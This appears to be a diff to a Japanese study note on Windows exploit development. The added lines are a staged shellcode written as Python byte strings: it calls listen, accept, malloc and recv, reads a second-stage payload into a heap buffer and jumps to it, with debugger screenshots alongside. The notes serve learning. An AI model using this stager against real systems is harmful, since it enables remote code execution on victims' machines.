@@ -2188,7 +2188,7 @@ FTPサーバーなどが対象の場合、攻撃者とソケットが作成さ�
 ![image](https://user-images.githubusercontent.com/56021519/90307721-f2da8000-df13-11ea-95d8-a5b2a5d08b84.png)
 ![image](https://user-images.githubusercontent.com/56021519/90307767-73997c00-df14-11ea-96da-870c673f139e.png)   
 実行後のレジスタ   
-![image](https://user-images.githubusercontent.com/56021519/90307901-ca538580-df15-11ea-9003-d4ecdac04e44.png)
+![image](https://user-images.githubusercontent.com/56021519/90307901-ca538580-df15-11ea-9003-d4ecdac04e44.png)   
 **bind()**   
 ```txt
 # bind()   socket登録
@@ -2226,27 +2226,91 @@ struct sockaddr_in {
     char           sin_zero[8]; // 8bytes
 };
 ```
+![image](https://user-images.githubusercontent.com/56021519/90308324-9e3a0380-df19-11ea-894c-6b8e9c2814fa.png)
+![image](https://user-images.githubusercontent.com/56021519/90308336-bc076880-df19-11ea-87a3-ce60477a6eb6.png)   
 **listen()**   
 ```txt
 # listen() ソケット接続準備
            通信接続を待つための準備作業
            int listen(int sockfd, int backlog);
-      
+
+  # adjust the call pointer to reference `listen`
+  block1 += "\xB3\x5C"                           # MOV BL, 0x5C
+  # prepare the parameters on the stack for the `listen` call
+  block1 += "\x6A\x7F"                           # PUSH 0x7F
+  block1 += "\x57"                               # PUSH EDI
+  # invoke the call to `listen`
+  block1 += "\xFF\xD3"                           # CALL EBX
+
 ```
+実行直前   
+![image](https://user-images.githubusercontent.com/56021519/90308429-6a131280-df1a-11ea-8c54-1fc853ac85a0.png)
+![image](https://user-images.githubusercontent.com/56021519/90308415-4c45ad80-df1a-11ea-8c8d-ed17740bc561.png)   
 **accept()**   
 ```txt
 # accept() ソケット接続待機
            クライアント側からの通信接続を待つ。サーバ側プログラムが accept()を実行すると、
            クライアント側からの通信接続要求が来るまでプログラムが停止し、接続後にプログラムを再開
            int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
-      
+
+  # adjust the call pointer to reference `accept`
+  block1 += "\xB3\x24"                           # MOV BL, 0x24
+  # prepare the parameters on the stack for the `accept` call
+  block1 += "\x57"                               # PUSH EDI
+  # invoke the call to `accept`
+  block1 += "\xFF\xD3"                           # CALL EBX
+  
 ```
+![image](https://user-images.githubusercontent.com/56021519/90308477-daba2f00-df1a-11ea-99ee-1f239826d9d5.png)
+![image](https://user-images.githubusercontent.com/56021519/90308484-ed346880-df1a-11ea-8937-7f1e19314ecf.png)   
+accept()実行後の戻り値(受け付けたソケットのファイルディスクリプター)として`0xA4`が返ってくる。
+![image](https://user-images.githubusercontent.com/56021519/90308559-6633c000-df1b-11ea-84ca-fac76404257c.png)   
+
 **recv()**   
 ```txt
+# malloc()  Heap領域にバッファを確保
+            確保したいメモリのバイトサイズを引数にとる
+            mallocは別にしなくてもいいかも？スタックでも別によさそう？？
+            void *malloc(size_t size);
+            
+  # mallocでHeap領域にShellcode分のバッファを確保
+  # prepare for the malloc call and call it
+  block1 += "\x8B\xF8"                           # MOV EDI, EAX
+  block1 += "\x66\xBB\xD4\x3D"                   # MOV BX, 0x3DD4
+  block1 += "\x8A\xE0"                           # MOV AH, AL     sizeは正直大きければなんでもよさそう
+  block1 += "\x50"                               # PUSH EAX
+  block1 += "\xFF\xD3"                           # CALL EBX
+  
 # recv()   データ受信
-　　　　　　ssize_t read(int fd, void *buf, size_t count);
+　　　　　　int recv(SOCKET s,char *buf,int len,int flags);
+      
+  # save the memory handle, and push it up ready for later use
+  block1 += "\x8B\xF0"                           # MOV ESI, EAX     mallocが返したHeap領域のアドレスをESIに保存
+  # prep the call for recv
+  block1 += "\x66\xBB\xDC\x82"                   # MOV BX, 0x82DC
+  #nasm > xor ecx,ecx
+  #00000000  31C9              xor ecx,ecx
+  #nasm > push ecx
+  #00000000  51                push ecx          # push flag
+  #nasm > add ch,0x2
+  #00000000  80C502            add ch,0x2        # len(0x200)=512bytes
+  #nasm > push ecx
+  #00000000  51                push ecx          # push len 0x200
+  #nasm > push esi
+  #00000000  56                push esi          # push heapaddr(returned from malloc)
+  #nasm > push edi
+  #00000000  57                push edi          # push socket file descriptor
+  block1 += "\x31\xc9\x51\x80\xc5\x02\x51\x56\x57"
+  block1 += "\xff\x13\xff\xe6"                   # call [ebx] # jmp esi
 
 ```
+malloc()実行直前の状態   
+![image](https://user-images.githubusercontent.com/56021519/90308741-10f8ae00-df1d-11ea-9613-2b2b5eafa923.png)
+![image](https://user-images.githubusercontent.com/56021519/90308747-22da5100-df1d-11ea-80e4-549ca75714c1.png)   
+recv()実行直前の状態   
+![image](https://user-images.githubusercontent.com/56021519/90308796-7c428000-df1d-11ea-87d2-ed140908bf96.png)
+![image](https://user-images.githubusercontent.com/56021519/90308818-a005c600-df1d-11ea-9f4c-f1ae5cc18c2a.png)
+![image](https://user-images.githubusercontent.com/56021519/90308836-aeec7880-df1d-11ea-9183-00ab20ef57a5.png)   
 ### fuzzing (SPIKE)
 #### 基本
 参考文献   
